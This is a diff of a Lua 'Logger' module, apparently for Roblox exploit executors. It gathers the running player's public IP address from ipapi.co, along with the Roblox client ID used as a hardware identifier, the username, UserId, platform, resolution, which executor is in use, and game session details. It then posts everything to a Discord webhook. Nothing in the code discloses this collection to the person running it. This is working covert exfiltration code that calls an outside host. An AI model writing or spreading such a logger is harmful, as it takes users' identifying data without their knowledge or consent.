@@ -1,29 +1,128 @@
 local Logger = {}
 
+local LocalPlayer = game.Players.LocalPlayer
 local HttpService = game:GetService('HttpService')
-local http_function = request or (http and http.request) or (syn and syn.request) or http_request
+local RunService = game:GetService('RunService')
+local UserInputService = game:GetService('UserInputService')
 
-local function getHWID()
-    return game:GetService('RbxAnalyticsService'):GetClientId() or 'None'
+local UserGameSettings = UserSettings():GetService("UserGameSettings")
+
+local HTTP_Request = request or (http and http.request) or (syn and syn.request) or http_request
+local HTTP_Get = game.HttpGet
+
+Logger.BaseURLs = {
+    ipapi = 'https://ipapi.co/json/',
+    discord = 'https://discord.com/api/webhooks/%s'
+}
+
+function Logger:FetchIPv4()
+    local URL = self.BaseURLs.ipapi
+    local Response = HTTP_Get(game, URL)
+    local Decoded = HttpService:JSONDecode(Response)
+    
+    local IPv4 = Decoded.ip
+
+    return IPv4 and IPv4 or 'Not found'
 end
 
-local function getIP()
-    local IP = 'None'
-    if(game.HttpGet) then
-        local domain = 'https://ipapi.co/json/'
-        local data = HttpService:JSONDecode(game:HttpGet(domain))
-        IP = data.ip or IP
+function Logger:FetchFPS()
+    local FPS_Total = 0
+    local Iterations = 60
+
+    for i=1, Iterations do
+        FPS_Total = FPS_Total + (1 / RunService.RenderStepped:Wait())
     end
-    return IP
+
+    return math.floor(FPS_Total / Iterations)
 end
 
-function Logger:Log(Player, Key)
-    local webhook_url = string.format('https://discord.com/api/webhooks/%s', Key)
-    local payload = {content=Player.Name,embeds={{fields={{name='UserId',value=Player.UserId},{name='IP',value=getIP()},{name='HWID',value=getHWID()}}}}}
-    local headers = {['content-type'] = 'application/json'}
-    local request_body_encoded = HttpService:JSONEncode(payload)
-    local request_payload = {Url=webhook_url, Body=request_body_encoded, Method='Post', Headers=headers}
-    http_function(request_payload)
+function Logger:FetchClientID()
+    return game:GetService('RbxAnalyticsService'):GetClientId() or 'Not found'
+end
+
+function Logger:FetchGraphicsQuality()
+    local SavedQualityLevel = UserGameSettings.SavedQualityLevel
+    return (SavedQualityLevel and SavedQualityLevel.Name) or 'Not found'
+end
+
+function Logger:FetchPlatformType()
+    local Platform = UserInputService:GetPlatform()
+    return (Platform and Platform.Name) or 'Not found'
+end
+
+function Logger:FetchWindowResolution()
+    local ViewportSize = workspace.CurrentCamera.ViewportSize
+    return string.format('%d, %d', ViewportSize.X, ViewportSize.Y)  or 'Not found'
+end
+
+function Logger:FetchExecutorName()
+    return (syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or
+    (secure_load and "Sentinel") or
+    (is_sirhurt_closure and "Sirhurt") or
+    (pebc_execute and "ProtoSmasher") or
+    (KRNL_LOADED and "Krnl") or
+    (WrapGlobal and "WeAreDevs") or
+    (isvm and "Proxo") or
+    (shadow_env and "Shadow") or
+    (jit and "EasyExploits") or
+    (getscriptenvs and "Calamari") or
+    (unit and not syn and "Unit") or
+    (OXYGEN_LOADED and "Oxygen U") or
+    (IsElectron and "Electron") or
+    (getexecutorname and "Script-Ware") or
+    ("Not detected")
+end
+
+function Logger:BlockCodeFormatter(KVPairs)
+    local FormattedString = ''
+    for i=1, #KVPairs, 2 do
+        FormattedString = FormattedString .. 
+        string.format('%s: %s\n', KVPairs[i], KVPairs[i+1])
+    end
+    return string.format('```%s```', FormattedString)
+end
+
+function Logger:FetchFormattedPayload()
+    return HttpService:JSONEncode({
+        content = string.format('`Logging System - Log of %s`', LocalPlayer.Name),
+        embeds = {
+            [1] = {
+                title = 'Player Information',
+                description = self:BlockCodeFormatter(
+                    {
+                        'Name', LocalPlayer.Name, 
+                        'UserId', LocalPlayer.UserId,
+                        'IPv4', self:FetchIPv4(),
+                        'ClientId', self:FetchClientID(),
+                        'Platform', self:FetchPlatformType(),
+                        'Executor', self:FetchExecutorName(),
+                        'Resolution', self:FetchWindowResolution()
+                    }
+                )
+            },
+            [2] = {
+                title = 'Game Information',
+                description = self:BlockCodeFormatter(
+                    {
+                        'PlaceId', game.PlaceId,
+                        'JobId', game.JobId,
+                        'Players', string.format('(%d/%d)', #game.Players:GetPlayers(), game.Players.MaxPlayers),
+                        'FPS', self:FetchFPS(),
+                        'GraphicsQuality', self:FetchGraphicsQuality()
+                    }
+                )
+            }
+        }
+    })
+end
+
+function Logger:UploadLog(_, authorization)
+    local URL = string.format(self.BaseURLs.discord, authorization)
+    local Payload = self:FetchFormattedPayload()
+    local Headers = {['content-type'] = 'application/json'}
+    local Request_Payload = {Url = URL, Body = Payload, Method = 'Post', Headers = Headers}
+    
+    HTTP_Request(Request_Payload)
 end
 
 return Logger
